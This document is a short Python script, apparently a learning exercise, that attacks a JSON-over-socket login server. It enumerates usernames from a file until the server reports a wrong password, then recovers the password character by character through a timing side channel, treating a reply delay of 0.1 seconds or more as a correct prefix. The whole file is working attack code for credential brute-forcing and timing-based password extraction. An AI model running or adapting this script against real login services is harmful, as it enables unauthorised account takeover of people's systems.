import sys
import socket
import json
import time

#chars
chars = ['aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789']

#functions to send/recieve the message
def msg_sending(json_login):
    msg = json_login
    encoded_msg = msg.encode()
    client.send(encoded_msg)
def response_recv():
    response = client.recv(1024)
    decoded_response = response.decode()
    json_decoded_response = json.loads(decoded_response)
    return json_decoded_response

ip = sys.argv[1]
port = sys.argv[2]

with socket.socket() as client:
    #establishing the connection
    client.connect((ip, int(port)))
    #finding the correct login
    with open(r'.\hacking\logins.txt', 'r') as login_file:
        for line in list(login_file):
            login_pass_dict = {'login': line.rstrip(), 'password': ''}
            #converting into json
            json_pass_login = json.dumps(login_pass_dict, indent=4)
            #sending the message
            msg_sending(json_pass_login)
            #recieving response from the server
            recv = response_recv()
            #correct_login finding
            if recv['result'] == 'Wrong password!':
                correct_login = login_pass_dict['login']
                break

    #finding the correct password
    correct_char = ''
    while True:
        for char in list(chars[0]):
            char = correct_char + char
            char = char.rstrip()
            login_pass_dict = {'login': correct_login, 'password': char}
            json_pass_login = json.dumps(login_pass_dict, indent=4)
            msg_sending(json_pass_login)
            #finding the start point
            start = time.perf_counter()
            recv = response_recv()
            #finding the end point
            end = time.perf_counter()
            #calculating the delay
            delay = end - start
            #correct_password finding
            if delay >= 0.1:
                correct_char = char
            #breaking the for loop
            if recv['result'] == 'Connection success!':
                print(json_pass_login)
                break
        #breaking the while loop
        if recv['result'] == 'Connection success!':
            break
